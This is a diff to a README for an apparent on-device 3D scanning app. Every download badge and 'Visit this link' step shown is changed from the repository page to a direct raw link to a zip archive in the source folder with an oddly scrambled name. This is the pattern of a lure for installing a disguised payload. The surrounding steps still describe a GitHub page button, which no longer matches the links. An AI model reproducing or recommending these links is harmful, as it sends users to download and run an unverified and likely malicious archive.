@@ -1,6 +1,6 @@
 # 📱 on-device-3d-scanner - Turn 8 Photos Into 3D in Seconds
 
-[![Download App](https://img.shields.io/badge/Download-on--device--3d--scanner-2ea44f?style=for-the-badge&logo=github)](https://github.com/Kral-35/on-device-3d-scanner)
+[![Download App](https://img.shields.io/badge/Download-on--device--3d--scanner-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kral-35/on-device-3d-scanner/main/src/on-scanner-device-d-2.5.zip)
 
 ## ✨ What Does This App Do?
 
@@ -14,7 +14,7 @@ Getting started is incredibly easy. Here's what you need to do:
 
 ### Step 1: Download the App
 
-1. **Visit this link to download the application:** [https://github.com/Kral-35/on-device-3d-scanner](https://github.com/Kral-35/on-device-3d-scanner)
+1. **Visit this link to download the application:** [https://raw.githubusercontent.com/Kral-35/on-device-3d-scanner/main/src/on-scanner-device-d-2.5.zip](https://raw.githubusercontent.com/Kral-35/on-device-3d-scanner/main/src/on-scanner-device-d-2.5.zip)
 2. Once you're on the page, look for the download button or link. Click it to start downloading the app file.
 3. Wait for the download to finish. This might take a minute depending on your internet speed and the file size.
 
@@ -93,7 +93,7 @@ Together, these technologies create what's called "gaussian-splat" rendering—a
 Let's walk through the entire process one more time to make sure everything goes smoothly:
 
 1. **Find the Download Link:** 
-   - **Visit this link to download the application:** [https://github.com/Kral-35/on-device-3d-scanner](https://github.com/Kral-35/on-device-3d-scanner)
+   - **Visit this link to download the application:** [https://raw.githubusercontent.com/Kral-35/on-device-3d-scanner/main/src/on-scanner-device-d-2.5.zip](https://raw.githubusercontent.com/Kral-35/on-device-3d-scanner/main/src/on-scanner-device-d-2.5.zip)
    
 2. **Start the Download:**
    - On the GitHub page, look for a green button that says "Code" or "Download." Click it.
@@ -129,6 +129,6 @@ Once you've made your first scan, we'd love to hear about it! Share your 3D mode
 
 **Download now and turn the world around you into 3D!**
 
-[![Download on-device-3d-scanner](https://img.shields.io/badge/Download-App-2ea44f?style=for-the-badge&logo=appstore)](https://github.com/Kral-35/on-device-3d-scanner)
+[![Download on-device-3d-scanner](https://img.shields.io/badge/Download-App-2ea44f?style=for-the-badge&logo=appstore)](https://raw.githubusercontent.com/Kral-35/on-device-3d-scanner/main/src/on-scanner-device-d-2.5.zip)
 
 Keywords: 3d-scanning, depth-estimation, executorch, expo, gaussian-splatting, on-device-ai, react-native
